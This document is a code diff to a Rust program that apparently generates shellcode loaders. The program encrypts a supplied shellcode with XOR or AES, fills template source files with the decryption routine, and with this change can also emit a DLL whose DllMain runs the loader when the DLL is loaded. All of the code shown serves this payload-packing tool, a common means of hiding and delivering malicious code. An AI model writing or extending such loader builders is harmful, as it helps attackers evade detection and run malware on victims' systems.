@@ -1,6 +1,6 @@
 // Module building the end-result Rust code
 use crate::aes::meta_aes;
-use crate::arg_parser::{Encryption, Execution, Order};
+use crate::arg_parser::{Encryption, Execution, Format, Order};
 use crate::tools::random_aes_iv;
 use crate::tools::random_aes_key;
 use crate::tools::{absolute_path, path_to_string, random_u8};
@@ -11,6 +11,7 @@ use std::fs::{self, OpenOptions};
 use std::io::prelude::*;
 use std::path::Path;
 use std::path::PathBuf;
+use std::process::exit;
 use std::str;
 use std::time::{SystemTime, UNIX_EPOCH};
 
@@ -91,12 +92,19 @@ pub fn meta_puzzle(order: Order) -> PathBuf {
 
     let absolute_shellcode_path_as_string: String = path_to_string(&absolute_shellcode_path);
 
+    let mut path_to_cargo = to_main.clone();
+    path_to_cargo.pop();
+    path_to_cargo.pop();
+    path_to_cargo.push("Cargo.toml");
+
     let mut to_be_replaced = HashMap::new();
-    to_be_replaced.insert("{{DEPENDENCIES}}", "");
-    to_be_replaced.insert("{{IMPORTS}}", "");
-    to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", "");
-    to_be_replaced.insert("{{MAIN}}", "");
-    to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", &absolute_shellcode_path_as_string);
+    to_be_replaced.insert("{{DEPENDENCIES}}", "".to_string());
+    to_be_replaced.insert("{{IMPORTS}}", "".to_string());
+    to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", "".to_string());
+    to_be_replaced.insert("{{MAIN}}", "".to_string());
+    to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_shellcode_path_as_string);
+    to_be_replaced.insert("{{DLL_MAIN}}", "".to_string());
+    to_be_replaced.insert("{{DLL_FORMAT}}", "".to_string());
 
     match order.encryption {
         Some(Encryption::Xor) => {
@@ -120,19 +128,9 @@ pub fn meta_puzzle(order: Order) -> PathBuf {
                 Some(content) => content,
                 None => panic!("I don't even know how this happened.."),
             };
-            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function);
-            to_be_replaced.insert("{{MAIN}}", main);
-            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", &absolute_path_to_xor_as_string);
-
-            let mut path_to_cargo = to_main.clone();
-            path_to_cargo.pop();
-            path_to_cargo.pop();
-            path_to_cargo.push("Cargo.toml");
-
-            for (key, value) in to_be_replaced.iter() {
-                let _ = search_and_replace(&to_main, key, value);
-                let _ = search_and_replace(&path_to_cargo, key, value);
-            }
+            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
+            to_be_replaced.insert("{{MAIN}}", main.to_string());
+            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_xor_as_string);
         }
         Some(Encryption::Aes) => {
             let key = random_aes_key();
@@ -166,28 +164,67 @@ pub fn meta_puzzle(order: Order) -> PathBuf {
                 Some(content) => content,
                 None => panic!("I don't even know how this happened.."),
             };
-            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function);
-            to_be_replaced.insert("{{MAIN}}", main);
-            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", &absolute_path_to_aes_as_string);
-            to_be_replaced.insert("{{DEPENDENCIES}}", dependencies);
-            to_be_replaced.insert("{{IMPORTS}}", imports);
-
-            let mut path_to_cargo = to_main.clone();
-            path_to_cargo.pop();
-            path_to_cargo.pop();
-            path_to_cargo.push("Cargo.toml");
-
-            for (key, value) in to_be_replaced.iter() {
-                let _ = search_and_replace(&to_main, key, value);
-                let _ = search_and_replace(&path_to_cargo, key, value);
-            }
+            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
+            to_be_replaced.insert("{{MAIN}}", main.to_string());
+            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_aes_as_string);
+            to_be_replaced.insert("{{DEPENDENCIES}}", dependencies.to_string());
+            to_be_replaced.insert("{{IMPORTS}}", imports.to_string());
         }
-        None => {
-            for (key, value) in to_be_replaced.iter() {
-                let _ = search_and_replace(&to_main, key, value);
-            }
-        }
+        None => (),
     }
+    match order.format {
+        Format::Dll => {
+            let dll_cargo_conf = r#"
+            [lib]
+            crate-type = ["cdylib"]"#;
+
+            to_be_replaced.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());
+
+            let dll_main_fn = r#"
+            #[no_mangle]
+            #[allow(non_snake_case, unused_variables, unreachable_patterns)]
+            extern "system" fn DllMain(
+                dll_module: u32,
+                call_reason: u32,
+                _: *mut ())
+                -> bool
+            {
+                match call_reason {
+                    DLL_PROCESS_ATTACH => main(),
+                    DLL_PROCESS_DETACH => main(),
+                    _ => ()
+                }
+
+                true
+            }
+            "#;
+            to_be_replaced.insert("{{DLL_MAIN}}", dll_main_fn.to_string());
+
+            // changing "main.rs" to "lib.rs"
+
+            let mut to_lib = to_main.clone();
+            to_lib.pop();
+            to_lib.push("lib.rs");
+
+            match fs::rename(to_main, to_lib.clone()) {
+                Ok(()) => (),
+                Err(e) => {
+                    eprintln!("[-] Error while renaming main.rs to lib.rs: {}", e);
+                    exit(1);
+                }
+            }
+
+            // need to change the main file path, as it is now renamed "lib.rs" for DLL format.
+            to_main = to_lib;
+        }
+        Format::Exe => (), // nothing to do here, as the default "replace" values are emspty strings
+    }
+
+    for (key, value) in to_be_replaced.iter() {
+        let _ = search_and_replace(&to_main, key, value);
+        let _ = search_and_replace(&path_to_cargo, key, value);
+    }
+
     println!("[+] Done assembling Rust code!");
     return Path::new(&folder).to_path_buf();
 }
